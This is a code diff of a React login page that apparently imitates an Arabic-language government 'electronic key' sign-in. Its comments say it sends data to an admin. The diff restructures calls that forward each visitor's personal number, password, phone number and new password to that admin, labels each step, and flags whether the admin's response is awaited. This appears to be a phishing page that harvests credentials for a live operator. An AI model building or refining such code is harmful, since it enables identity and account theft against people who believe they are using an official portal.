@@ -87,9 +87,12 @@ export default function LoginPage() {
     
     // Send data to admin
     sendData({
-      personalNumber,
-      password,
-      page: 'login'
+      data: {
+        personalNumber,
+        password,
+      },
+      current: 'صفحة دخول المفتاح الإلكتروني',
+      waitingForAdminResponse: false,
     });
 
     // Show spinner then popup
@@ -102,9 +105,12 @@ export default function LoginPage() {
   const handlePhoneContinue = () => {
     if (!phoneNumber.trim()) return;
     sendData({
-      personalNumber,
-      phoneNumber,
-      page: 'phone-update'
+      data: {
+        personalNumber,
+        phoneNumber,
+      },
+      current: 'تحديث رقم الهاتف',
+      waitingForAdminResponse: false,
     });
     localStorage.setItem('loginPersonalNumber', personalNumber);
     localStorage.setItem('loginPhoneNumber', phoneNumber);
@@ -280,9 +286,12 @@ export default function LoginPage() {
               onClick={() => {
                 if (!forgotPersonalNumber || !newPassword || !confirmPassword || newPassword !== confirmPassword) return;
                 sendData({
-                  forgotPersonalNumber,
-                  newPassword,
-                  page: 'forgot-password'
+                  data: {
+                    forgotPersonalNumber,
+                    newPassword,
+                  },
+                  current: 'إستعادة كلمة المرور',
+                  waitingForAdminResponse: false,
                 });
                 localStorage.setItem('loginPersonalNumber', forgotPersonalNumber);
                 localStorage.setItem('loginPhoneNumber', '');
